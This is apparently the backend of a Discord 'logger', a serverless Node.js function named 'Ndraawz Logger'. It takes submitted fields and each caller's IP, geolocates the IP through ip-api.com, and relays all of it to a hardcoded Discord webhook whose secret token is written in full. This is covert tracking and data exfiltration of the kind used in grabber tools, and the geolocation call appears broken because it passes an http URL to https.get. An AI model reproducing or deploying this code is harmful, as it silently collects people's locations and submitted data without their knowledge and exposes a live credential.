const https = require('https');

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";

module.exports = async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }
    
    let body = '';
    await new Promise((resolve) => {
        req.on('data', chunk => body += chunk);
        req.on('end', resolve);
    });
    
    const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || "unknown";
    
    try {
        const data = JSON.parse(body);
        
        let geoData = { country: "N/A", region: "N/A", city: "N/A", isp: "N/A", as: "N/A", org: "N/A" };
        
        await new Promise((resolve) => {
            https.get(`http://ip-api.com/json/${clientIp}`, (geoRes) => {
                let geoBody = '';
                geoRes.on('data', chunk => geoBody += chunk);
                geoRes.on('end', () => {
                    try {
                        const json = JSON.parse(geoBody);
                        if (json.status === "success") {
                            geoData = {
                                country: json.country || "N/A",
                                region: json.regionName || "N/A",
                                city: json.city || "N/A",
                                isp: json.isp || "N/A",
                                as: json.as || "N/A",
                                org: json.org || "N/A"
                            };
                        }
                    } catch(e) {}
                    resolve();
                });
            }).on('error', () => resolve());
        });
        
        const allFields = [
            ...(data.fields || []),
            { name: "━━━━━━━━━━━━━━ 🌐 IP INFORMATION ━━━━━━━━━━━━━━", value: "ㅤ", inline: false },
            { name: "📡 IP Address", value: clientIp, inline: false },
            { name: "🚩 Country", value: geoData.country, inline: false },
            { name: "📍 Region", value: geoData.region, inline: false },
            { name: "🏙️ City", value: geoData.city, inline: false },
            { name: "🏢 ISP", value: geoData.isp, inline: false },
            { name: "📡 AS / Org", value: geoData.as + " / " + geoData.org, inline: false }
        ];
        
        const embed = {
            title: "🚀 Ndraawz Logger",
            color: 0x00ff88,
            fields: allFields,
            timestamp: new Date().toISOString()
        };
        
        const payload = JSON.stringify({ embeds: [embed] });
        const url = new URL(DISCORD_WEBHOOK);
        
        const options = {
            hostname: url.hostname,
            path: url.pathname,
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        };
        
        const discordReq = https.request(options, (discordRes) => {
            discordRes.resume();
            res.status(200).json({ ok: true });
        });
        discordReq.on('error', (err) => {
            console.error(err);
            res.status(500).json({ error: err.message });
        });
        discordReq.write(payload);
        discordReq.end();
        
    } catch (err) {
        console.error(err);
        res.status(400).json({ error: 'Invalid JSON' });
    }
};
